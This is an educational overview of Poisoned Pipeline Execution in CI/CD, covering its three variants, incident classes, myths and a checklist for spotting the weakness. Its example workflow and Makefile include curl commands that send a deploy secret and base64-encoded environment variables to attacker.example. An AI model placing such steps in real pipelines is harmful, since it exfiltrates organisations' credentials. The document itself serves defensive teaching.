# CICD-SEC-4: Poisoned Pipeline Execution - Overview

## Table of Contents
- [What is Poisoned Pipeline Execution?](#what-is-poisoned-pipeline-execution)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [The Three Types of PPE](#the-three-types-of-ppe)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Detectability](#prevalence-and-detectability)
- [Common Misunderstandings](#common-misunderstandings)

## What is Poisoned Pipeline Execution?

**Poisoned Pipeline Execution (PPE)** is the risk that an attacker who can influence the *definition* of a CI/CD pipeline—or the files and commands that pipeline runs—gets their own code executed inside the pipeline. Once code runs inside the pipeline it inherits the pipeline's identity: its secrets, its cloud credentials, its registry tokens, its access to source and artifacts. The build system becomes a confused deputy that runs the attacker's instructions with the organisation's most privileged automation identity.

The core insight is that **a pipeline is not just infrastructure—it is code, and that code usually lives in the same repository it builds**. A workflow file (`.github/workflows/*.yml`), a `.gitlab-ci.yml`, or a `Jenkinsfile` is checked out from a branch and executed automatically on an event such as a push or a pull request. Anyone who can influence what those files contain, or what the steps inside them invoke, can influence what the runner executes. PPE is what happens when that influence reaches an attacker who should only have been able to *propose* a change, not *run privileged automation*.

CICD-SEC-4 sits in the OWASP Top 10 CI/CD Security Risks because modern pipelines are simultaneously **highly privileged** (they deploy to production, sign releases, and hold long-lived cloud credentials) and **highly automated** (they trigger on ordinary developer events, sometimes from complete strangers via fork pull requests). PPE is the collision of those two properties.

### Core Concept

```
Normal pipeline:
  trusted change  ->  reviewed & merged  ->  pipeline runs trusted code
                                              with secrets  ->  build/deploy

Poisoned pipeline:
  attacker influences the pipeline definition OR a file it executes
        (branch, fork PR, Makefile, build script, test config, npm hook)
                     |
                     v
  pipeline runs ATTACKER code with the pipeline's identity
                     |
                     v
  steal CI secrets/tokens  ->  tamper artifacts  ->  pivot to prod/cloud
```

### Why It's Different from "Just Committing Bad Code"

Every developer can put code into a repository they own; that is the point of a repository. PPE is dangerous because of **who runs the code and with what privileges**. The distinction is between:

- **Code that runs on the attacker's own machine** — no organisational privilege gained.
- **Code that runs inside the CI pipeline** — it executes as the pipeline's service identity, with access to whatever secrets and tokens the pipeline can reach.

PPE converts the first into the second. A person who can only open a pull request from a fork—an untrusted outsider—should never be able to reach the second. When a misconfiguration lets them, that is the entire vulnerability.

## Why Does This Matter?

### Business Impact

- **Credential and secret theft**: Pipelines routinely hold cloud deploy keys, container-registry tokens, signing keys, and package-registry publish tokens. Code running in the pipeline can read them from environment variables, mounted files, or the metadata service and exfiltrate them.
- **Supply-chain compromise**: An attacker who runs inside the build can tamper with the artifact that ships—injecting a backdoor into a binary, container image, or published package that is then trusted and distributed to every downstream consumer.
- **Production and cloud pivot**: Deploy pipelines are, by design, a path into production. Poisoning the pipeline can be a direct route to the cloud account or Kubernetes cluster the pipeline deploys to.
- **Trust erosion and regulatory fallout**: A poisoned release undermines the integrity guarantees customers rely on and can trigger breach-notification and compliance obligations.

### Technical Impact

- **Secret exfiltration**: Environment secrets, `GITHUB_TOKEN`, GitLab CI job tokens, and cloud OIDC assertions all become readable to injected code.
- **Lateral movement**: From the runner, an attacker can reach internal registries, artifact stores, other repositories the token can access, and the cloud metadata endpoint.
- **Persistence**: Injected steps can plant new deploy keys, add malicious webhooks, or modify the pipeline definition itself so the foothold survives.
- **Artifact tampering**: Because the attacker runs at build time, they can alter what is compiled, packaged, signed, and published—often invisibly.

## Technical Context

### The Trigger Model: Why Events Are the Attack Surface

CI systems run pipelines automatically in response to events—a push, a tag, a pull/merge request, a comment. The security question for every trigger is: **who can cause this event, and what privileges does the resulting run have?** PPE lives in the gap between those two things. A trigger that any outsider can cause (a fork pull request) must never produce a run that holds production secrets.

Three properties of the trigger determine the risk:

- **Who can influence the executed content** — only maintainers (branch of the main repo) or anyone (fork PR)?
- **What the run has access to** — are secrets, a privileged token, or a self-hosted runner in scope?
- **Whether the pipeline definition or its inputs are attacker-controllable** — can the attacker edit the workflow, or the scripts/config the workflow runs?

### Where the Attacker's Code Enters

| Surface | Example | How it becomes execution |
|---------|---------|--------------------------|
| Pipeline definition | `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile` | Attacker edits the steps directly; the runner executes them |
| Build scripts | `Makefile`, `build.sh`, `gradlew`, `setup.py` | Pipeline calls the script; attacker changed its contents |
| Package hooks | `npm run build`, `preinstall`/`postinstall` scripts | Install/build step runs attacker-defined lifecycle hooks |
| Test & lint config | `jest.config.js`, `conftest.py`, `.eslintrc.js`, `tox.ini` | Test/lint step loads and executes attacker-controlled config code |
| Untrusted event data | `${{ github.event.pull_request.title }}` | Interpolated into a shell `run:` block — command injection |
| Third-party actions | `uses: some/action@main` | Unpinned dependency is swapped for a malicious version |

## The Three Types of PPE

OWASP splits Poisoned Pipeline Execution into three variants based on *how* the attacker gets their code to run. All three end the same way—attacker code executing with pipeline privileges—but they differ in what the attacker needs to control.

### 1. Direct PPE (D-PPE)

The attacker **edits the pipeline definition itself**. If a user can push a branch or open a pull request whose workflow file is then executed, and that execution has access to secrets, they can simply add a malicious step.

```yaml
# Attacker pushes a branch containing this workflow, which runs on push:
name: build
on: [push]
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s https://attacker.example/x -d "$SECRET_DEPLOY_KEY"
        env:
          SECRET_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

D-PPE depends on the CI running pipeline definitions from branches or PRs that less-trusted users can create, *with secrets in scope*. In systems where the workflow that runs is always the one from the default branch (not the PR branch), D-PPE via fork is blunted—but GitLab and Jenkins configurations that execute the branch's own pipeline file are classic D-PPE targets.

### 2. Indirect PPE (I-PPE)

The attacker **cannot edit the pipeline file** (perhaps it is protected, or always taken from the default branch), but the pipeline *runs files that the attacker can edit*. The workflow is trusted; the thing it invokes is not.

```makefile
# Trusted workflow (unchanged) simply runs the repo's build:
#   - run: make build      # or: npm run build, ./gradlew test, pip install -e .

# Attacker edits the Makefile the workflow calls:
build:
	curl -s https://attacker.example/x -d "$(env | base64)"
```

I-PPE is the more common and more subtle variant. Any file the pipeline executes is in scope: `Makefile`, shell scripts, `package.json` scripts and lifecycle hooks, test frameworks that execute config as code (`conftest.py`, `jest.config.js`), linters with executable config, and build tools. Because these files look like ordinary application code, a malicious change can pass review far more easily than an obvious edit to a deploy workflow.

### 3. Public PPE (3PE)

The attacker is a **complete outsider** who opens a *fork pull request* against a public (or accessible) repository whose pipeline runs on such PRs with privileges. This is D-PPE or I-PPE where the attacker needs no repository permissions at all—anyone on the internet can trigger it.

```yaml
# Vulnerable: privileged trigger that also checks out untrusted PR code
on:
  pull_request_target:        # runs with secrets AND repo write token
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's fork code
      - run: npm ci && npm test    # attacker's package scripts run WITH secrets
```

3PE is the most dangerous because the attacker population is unbounded. The canonical GitHub Actions form combines `pull_request_target` (which grants secrets and a read/write `GITHUB_TOKEN`) with an explicit checkout of the untrusted PR head—so the outsider's code executes in a context that was only ever meant to run trusted code.

## Real-World Impact

The examples below are **classes of real, publicly discussed incidents**, described generically. They illustrate the pattern without asserting specific fabricated figures or CVE identifiers.

### Incident Class 1: `pull_request_target` Secret Theft via Fork PR

**Pattern**:
- A public repository used `pull_request_target` so that fork PRs could be labelled, commented on, or auto-triaged with a token—a legitimate use.
- The workflow additionally checked out the PR head and ran build/test steps from it, or interpolated PR fields into a shell command.

**Impact**: Researchers and attackers demonstrated that an outsider opening a crafted fork PR could run arbitrary commands in the privileged context and read repository or organisation secrets. Many maintainers of popular open-source projects received coordinated disclosures for exactly this shape of bug.

**Root cause**: A privileged trigger executing untrusted PR content. The fix is to keep untrusted checkout and secrets in separate, appropriately-triggered jobs.

### Incident Class 2: Compromised / Swapped Third-Party Action

**Pattern**:
- Workflows referenced third-party actions by a mutable reference (`@main`, `@v1`, or a branch/tag the maintainer could move).
- An action's repository or a maintainer account was compromised, or a tag was repointed to malicious code.

**Impact**: Every pipeline that resolved the mutable reference at run time pulled and executed the malicious version, exposing whatever secrets those jobs held. Because one action can be used by thousands of repositories, the blast radius is large.

**Root cause**: Unpinned dependencies in the pipeline. Pinning to a full commit SHA makes the referenced code immutable.

### Incident Class 3: Self-Hosted Runner Abused by Fork PR

**Pattern**:
- A project attached a self-hosted runner (often for GPU, licensed tools, or internal network access) and allowed workflows from fork PRs to use it.
- Self-hosted runners are frequently non-ephemeral and sit inside a trusted network.

**Impact**: An outsider's fork PR executed on the runner, giving code execution on a long-lived host inside the organisation's network—enabling persistence, credential harvesting from the runner, and lateral movement.

**Root cause**: Untrusted code on a privileged, non-ephemeral runner. Ephemeral runners and requiring approval for fork-PR runs directly address this.

### Incident Class 4: Script Injection via Untrusted Event Data

**Pattern**:
- A workflow interpolated an attacker-controllable field—PR title, branch name, commit message, issue body—directly into a shell `run:` step.

**Impact**: By crafting the field (for example a PR title containing shell metacharacters), an attacker injected commands that ran with the workflow's privileges—classic command injection, but through pipeline templating rather than application input.

**Root cause**: Treating untrusted event data as trusted template input. Passing it through an environment variable and quoting it, instead of inlining it, removes the injection.

## Prevalence and Detectability

Poisoned Pipeline Execution is recognised in the **OWASP Top 10 CI/CD Security Risks** as one of the most impactful CI/CD-specific weaknesses. Rather than cite specific counts, the defensible picture is:

- The misconfigurations that enable PPE are **common and easy to introduce**—a single line (`pull_request_target`, an unpinned `@main`, an inlined `${{ }}` expression) is enough.
- They are **detectable by static review** of pipeline files: dangerous triggers, untrusted checkout, unpinned actions, and expression injection are all greppable patterns.
- The impact is rated **severe**: successful PPE typically yields secret theft, artifact tampering, or a pivot to production—the pipeline is one of the highest-value targets in the organisation.

> Note: exact incident counts vary by source and year. The durable takeaway is that PPE-enabling patterns are easy to introduce, easy to find in review, and expensive when exploited—so the leverage is entirely on prevention and code review of pipeline definitions.

## Common Misunderstandings

### Myth 1: "Fork PRs can't be dangerous—they're just proposed changes"

**Reality**: A proposed change is harmless only if the CI that reacts to it has no secrets and no privileged token. The moment a fork-PR trigger grants secrets or checks out and runs the PR's own code with them, an outsider's proposal becomes an outsider's code execution.

### Myth 2: "We protected the workflow file, so we're safe"

**Reality**: Protecting the pipeline definition stops Direct PPE but not *Indirect* PPE. If the trusted workflow runs `make`, `npm run build`, or a test framework, an attacker who edits the `Makefile`, a lifecycle hook, or a test config still gets code execution.

### Myth 3: "`pull_request_target` is just a more convenient `pull_request`"

**Reality**: They are fundamentally different trust models. `pull_request` runs the PR's code *without* secrets and with a read-only token; `pull_request_target` runs in the base repo's context *with* secrets and a read/write token. Using the latter and then checking out PR code is the textbook 3PE.

### Myth 4: "Pinning an action to `@v3` is pinning"

**Reality**: Tags and branches are mutable—they can be repointed to new code at any time. Only a **full commit SHA** is immutable. `@v3` can silently become different code tomorrow.

### Myth 5: "The `GITHUB_TOKEN` is low-privilege by default"

**Reality**: Depending on repository/organisation settings, the default token may have write access to the repository and packages. Unless you set `permissions:` explicitly, a poisoned job may be able to push code, publish packages, or approve its own changes.

### Myth 6: "Self-hosted runners are safer because they're on our network"

**Reality**: Being on your network makes them *more* attractive to an attacker who achieves PPE. A non-ephemeral self-hosted runner exposed to fork PRs is a persistent foothold inside your perimeter, not a safety feature.

## How PPE Differs from Related CI/CD Risks

| Aspect | Poisoned Pipeline Execution (CICD-SEC-4) | Insufficient Flow Control (CICD-SEC-1) | Dependency Chain Abuse (CICD-SEC-3) |
|--------|------------------------------------------|----------------------------------------|-------------------------------------|
| **Root cause** | Attacker-influenced pipeline definition or executed files run with pipeline privileges | Missing gates let a change reach production without proper review/approval | Malicious or confusable third-party package pulled into the build |
| **Where it lives** | Triggers, checkout, run steps, scripts, action pins | Branch protection, review requirements, deploy gates | Dependency manifests and resolution |
| **Typical fix** | Separate untrusted code from secrets; pin actions; least-privilege tokens | Enforce review/approval and protected branches | Pin, verify, and scope package sources |

## Key Takeaways

1. **A pipeline is code with privileges**—whoever influences that code, or the files it runs, can wield those privileges.
2. **The three variants—D-PPE, I-PPE, 3PE—differ only in what the attacker controls**; all end in attacker code running with pipeline secrets.
3. **Never run untrusted code with secrets in scope**—that single rule prevents most PPE.
4. **Protecting the workflow file is not enough**; the scripts, hooks, and configs it invokes are equally executable.
5. **Fork PRs are outsider input**—treat privileged triggers on them as remote code execution waiting to be configured wrongly.

## How to Identify if You're Vulnerable

- [ ] Does any workflow use `pull_request_target` (or an equivalent privileged fork trigger) and also check out or run the PR's code?
- [ ] Can a fork PR—or a branch pushed by a low-trust user—cause a run that has secrets in scope?
- [ ] Are third-party actions referenced by mutable tags/branches instead of full commit SHAs?
- [ ] Is any untrusted event field (`title`, `body`, branch name, commit message) interpolated directly into a `run:` shell block?
- [ ] Does the pipeline execute repo-controlled scripts (`Makefile`, `npm` hooks, test/lint config) that a PR could modify while secrets are present?
- [ ] Is the default pipeline token left at broad/write permissions instead of an explicit least-privilege `permissions:` block?
- [ ] Do fork PRs run on non-ephemeral or self-hosted runners without required approval?
- [ ] Are build credentials and deploy credentials the same, so a build-time compromise reaches production?

If you answered "yes" or "not sure" to several of these, you likely have an exploitable PPE path today.

## Next Steps

- **[Attack Vectors](attack-vectors.md)**: How attackers reach and poison the pipeline
- **[Prevention](prevention.md)**: Keep untrusted code away from secrets and lock down triggers
- **[Examples](examples.md)**: Insecure vs. secure pipelines in GitHub Actions, GitLab CI, and Jenkins
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10 lessons
- **[Practice](/practice)**: Apply what you have learned in hands-on exercises
